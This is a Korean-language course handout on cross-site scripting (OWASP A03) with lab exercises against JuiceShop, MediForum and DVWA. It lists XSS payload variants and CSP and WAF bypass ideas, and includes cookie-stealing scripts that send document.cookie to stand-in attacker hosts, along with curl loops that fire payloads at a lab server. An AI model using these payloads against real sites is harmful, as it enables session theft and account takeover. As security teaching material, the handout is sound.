# Week 05 — OWASP A03 — XSS (Reflected / Stored / DOM)

> 본 주차는 XSS (Cross-Site Scripting) 3 타입. JuiceShop / MediForum / DVWA 의
> XSS challenge + CSP / SameSite cookie 우회.

## 학습 목표

1. XSS 3 타입 (Reflected / Stored / DOM-based)
2. payload 6 변형 (script / img / svg / iframe / event / encoding)
3. CSP (Content Security Policy) 우회
4. BeEF (Browser Exploitation Framework) 기본
5. cookie hijacking 시뮬
6. ModSec 941 차단 + 우회

## 1. XSS 3 타입

### 1.1 Reflected

URL 파라미터의 값이 응답 페이지에 그대로 출력 → 1회성.

```
http://target/search?q=<script>alert(1)</script>
```

### 1.2 Stored

서버 DB 에 저장 → 모든 방문자에 영향.

```
POST /comments
{ "comment": "<script>fetch('http://attacker.com?c='+document.cookie)</script>" }
```

### 1.3 DOM-based

JavaScript 가 클라이언트에서 URL 의 fragment 를 DOM 에 삽입.

```
http://target/#<img src=x onerror=alert(1)>
```

## 2. payload 6 변형

```
<script>alert(1)</script>                       # 기본
<img src=x onerror=alert(1)>                    # img 이벤트
<svg onload=alert(1)>                           # SVG
<iframe src=javascript:alert(1)>                # iframe
<body onload=alert(1)>                          # body 이벤트
<script>document.location=URL+document.cookie</script>  # cookie steal
```

URL encoding 변형:
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

## 3. CSP 우회

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

`unsafe-inline` 허용 시 inline script 가능. 또는 JSONP / open redirect 우회.

## 4. cookie hijacking 시뮬

attacker 의 서버 (또는 webhook.site) 로 cookie 전송:

```
<script>
  fetch('https://attacker-server.example/' + document.cookie)
</script>
```

JuiceShop 의 score-board 솔루션 중 하나.

## 5. BeEF 기본 (별 컨테이너)

```
beef-xss      # GUI + http://127.0.0.1:3000/ui/panel
```

XSS hook script 를 통해 피해자 브라우저 제어.

## 6. ATT&CK + CWE

| 표준 | 매핑 |
|------|------|
| ATT&CK | T1059.007 JavaScript |
| CWE | CWE-79 XSS |
| OWASP | A03 Injection |

## 7. 실습 1~5

### 1 — Reflected XSS 시도

```
ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}\n' -H 'Host: juice.6v6.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
```

### 2 — Stored XSS (mediforum)

```
ssh 6v6-attacker "curl -s -X POST -d 'comment=<script>alert(1)</script>' -H 'Host: mediforum.6v6.lab' http://10.20.30.1/comments"
```

### 3 — payload 6 변형 시도

```
for p in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>' '<iframe src=javascript:alert(1)>'; do
    code=$(ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \"http://10.20.30.1/?q=$p\"")
    echo "$code $p"
done
```

### 4 — ModSec 941 audit log

```
ssh 6v6-web 'sudo tail -5 /var/log/apache2/modsec_audit.log | head -1 | jq ".transaction.messages[] | select(.id | startswith(\"941\")) | .msg"'
```

### 5 — CSP header 확인

```
ssh 6v6-attacker 'curl -sI -H "Host: juice.6v6.lab" http://10.20.30.1/ | grep -i csp'
```

## 8. 과제

A. 3 타입 페이로드 (필수)
B. CSP 우회 가능성 (심화)
C. cookie hijacking 윤리 (정성)

## 9. W06 (인증·접근제어) 예고

OWASP A01 + A07 — hydra brute force / JWT none / IDOR.
